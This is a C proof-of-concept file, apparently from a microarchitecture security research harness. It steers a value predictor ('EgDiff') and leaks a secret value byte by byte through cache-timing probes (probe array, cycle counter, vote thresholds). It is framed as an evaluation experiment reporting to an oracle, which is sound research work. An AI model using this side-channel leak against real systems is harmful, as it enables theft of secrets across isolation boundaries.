/*
 * Layer 4 — Mode 2 experiment: commit-time NVQ capture + replay.
 *
 * This is a conformance experiment for the EgDiff model: it checks that the
 * commit-stage distance-polling update can be steered, through the
 * non-speculative value queue, to a chosen difference, and that the resulting
 * prediction can then be observed at dispatch.
 *
 * Design notes (see experiment/egdiff_eval/IMPLEMENTATION.md for the review):
 *  - The capture body must have EXACTLY ONE constant-valued load, at the
 *    d = 1 slot.  With 31 varying noise loads before the helper load and the
 *    attacker load last, the only distance whose difference is constant is
 *    d = 1, so distance polling walks 32 -> ... -> 2 and the 2 -> 1 step is
 *    the one that latches  0 - S = -S.  (A short periodic body instead locks
 *    on a self-distance; that was the earlier bug.)
 *  - One capture is performed per byte, because a straight-line replay lets the
 *    re-executed load commit and re-poll the entry.  A branch-shadow replay
 *    (plan.md section 4.2) would preserve it, but is not required here.
 *  - The architectural (post-squash) execution uses a probe slot OUTSIDE the
 *    measured range: when the register still holds the sentinel, the slot is
 *    LINES.  That avoids having to guess which byte line to exclude.
 *
 * Prints the measured value and a MATCH/NO-MATCH verdict, plus checksums.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LINES        256
#define LINE         64
#define PROBE_LINES  (LINES + 1)     /* last slot reserved for the sentinel */
#define PROBE_SZ     (PROBE_LINES * LINE)
#define NPAT         512
#define NOISE        31              /* noise loads between helper and load */
#define CAP          300
#define REPS         7
#define MARGIN       20              /* cycles a winning line must beat 2nd by */
#define MIN_VOTES    3               /* of REPS=7; below this, report unknown */
#define FLUSH_SZ     (128 * 1024)

#define SENTINEL     0xAAAAAAAAAAAAAAAAULL

static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
static volatile uint64_t noise[NOISE][NPAT];
static volatile uint64_t atk_buf[64];
static volatile uint64_t zero_buf[8];
static volatile uint8_t flushbuf[FLUSH_SZ];

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_l1(void)
{
    for (int i = 0; i < FLUSH_SZ; i += LINE)
        (void)flushbuf[i];
}

__attribute__((noinline, noclone))
static uint64_t
atk_load(volatile uint64_t *base, uint64_t idx)
{
    return base[idx & 63];
}

/* The target value and the helper live in a separate translation unit
 * (egdiff_secret.c), so this file has no architectural reference to the value
 * it is supposed to obtain. */
extern uint64_t victim_value_fenced(uint64_t token);
extern int oracle_report_v2(uint64_t recovered, uint64_t known_mask,
                            int arch_ok, uint64_t sink);

static uint64_t
mix(uint64_t x)
{
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBULL;
    return x ^ (x >> 31);
}

int
main(void)
{
    for (int k = 0; k < NOISE; k++)
        for (int i = 0; i < NPAT; i++)
            noise[k][i] = mix((uint64_t)(k * NPAT + i) + 0xA5A5);

    zero_buf[0] = 0;
    memset(probe, 0, sizeof(probe));

    uint64_t sink = 0;
    uint64_t recovered = 0;
    uint64_t known = 0;
    int arch_ok = 1;

    for (int b = 0; b < 8; b++) {
        int score[LINES];
        for (int k = 0; k < LINES; k++)
            score[k] = 0;
        int votes = 0;

        for (int attempt = 0; attempt < REPS; attempt++) {
            /* ---- Capture: exactly one constant load (the helper's) ---- */
            for (int i = 0; i < CAP; i++) {
                for (int k = 0; k < NOISE; k++)
                    sink += noise[k][i & (NPAT - 1)];
                (void)victim_value_fenced(0);   /* the single constant load */
                atk_buf[0] = 0;
                sink += atk_load(atk_buf, 0);
            }

            /* ---- Replay: base = 0 at d = 1, no helper call ---- */
            atk_buf[0] = SENTINEL;
            flush_l1();

            uint64_t z = zero_buf[0];
            uint64_t x = z | 1;
            x /= (z + 2);
            x /= (z + 3);
            x /= (z + 4);
            x /= (z + 5);
            x /= (z + 6);
            x /= (z + 7);
            x /= (z + 8);
            x /= (z + 9);
            x /= (z + 10);
            x /= (z + 11);
            x /= (z + 12);
            x /= (z + 13);

            uint64_t reg = atk_load(atk_buf, x);
            sink += reg;
            if (reg != SENTINEL)
                arch_ok = 0;

            /* Predicted value is -S; the architectural value is SENTINEL.
             * Route the latter to the reserved probe slot. */
            uint64_t slot = (reg == SENTINEL)
                          ? LINES
                          : (((uint64_t)(-reg) >> (8 * b)) & 0xff);
            volatile uint8_t *pp = probe + slot * LINE;
            (void)*pp;

            /* ---- Find the fastest AND second-fastest measured lines ---- */
            int best = -1, second = -1;
            uint64_t bestlat = ~0ULL, secondlat = ~0ULL;
            for (int k = 0; k < LINES; k++) {
                volatile uint8_t *q = probe + (size_t)k * LINE;
                uint64_t t1 = rdcycle();
                uint8_t v = *q;
                asm volatile("" :: "r"(v) : "memory");
                uint64_t t2 = rdcycle();
                uint64_t lat = t2 - t1;
                if (lat < bestlat) {
                    second = best; secondlat = bestlat;
                    best = k; bestlat = lat;
                } else if (lat < secondlat) {
                    second = k; secondlat = lat;
                }
            }
            /* Only count a clear win; otherwise the attempt is uninformative. */
            if (best >= 0 && bestlat + MARGIN < secondlat) {
                score[best]++;
                votes++;
            }
        }

        int leak = -1, max = 0, runner_up = 0;
        for (int k = 0; k < LINES; k++) {
            if (score[k] > max) {
                runner_up = max;
                max = score[k];
                leak = k;
            } else if (score[k] > runner_up) {
                runner_up = score[k];
            }
        }
        /* Require a vote floor and a 2x margin over the runner-up.  Without
         * both, a single lucky attempt can decide a byte (the old control
         * fabricated seven bytes this way). */
        if (max < MIN_VOTES || max < 2 * runner_up)
            leak = -1;
        if (leak >= 0) {
            recovered |= ((uint64_t)(uint8_t)leak) << (8 * b);
            known |= 1ULL << b;
        }
    }

    return oracle_report_v2(recovered, known, arch_ok, sink);
}
